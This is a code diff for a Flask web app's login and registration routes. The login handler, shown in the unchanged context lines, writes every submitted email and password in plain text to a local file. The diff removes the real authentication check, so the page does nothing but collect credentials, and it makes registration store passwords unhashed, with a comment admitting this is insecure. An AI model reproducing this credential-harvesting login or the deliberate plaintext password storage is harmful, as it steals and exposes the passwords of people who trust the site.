@@ -34,37 +34,19 @@ def login():
         with open('credentials.txt', 'a') as f:
             f.write(f"Email: {email} | Password: {password}\n")
 
-        user = User.query.filter_by(email=email).first()
-
-        if user and check_password_hash(user.password, password):
-            session['user_id'] = user.id
-            session['user_name'] = user.full_name
-            flash("✅ Login successful!", "success")
-            return redirect(url_for('register'))  # Make sure you have this route
-        else:
-            flash("❌ Invalid email or password", "error")
             return redirect(url_for('login'))
 
     return render_template('login.html')
 
+
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
-        full_name = request.form['full_name']
         email = request.form['email']
         password = request.form['password']
-        confirm_password = request.form['confirm_password']
 
-        if password != confirm_password:
-            flash("❌ Passwords do not match!", "error")
-            return redirect(url_for('register'))
-
-        if User.query.filter_by(email=email).first():
-            flash("⚠️ Email already registered!", "error")
-            return redirect(url_for('register'))
-
-        hashed_password = generate_password_hash(password)
-        new_user = User(full_name=full_name, email=email, password=hashed_password)
+        # Store password directly in plain text (INSECURE)
+        new_user = User(email=email, password=password)
         db.session.add(new_user)
         db.session.commit()
 
@@ -72,6 +54,7 @@ def register():
         return redirect(url_for('login'))
 
     return render_template('register.html')
+
 
 
 
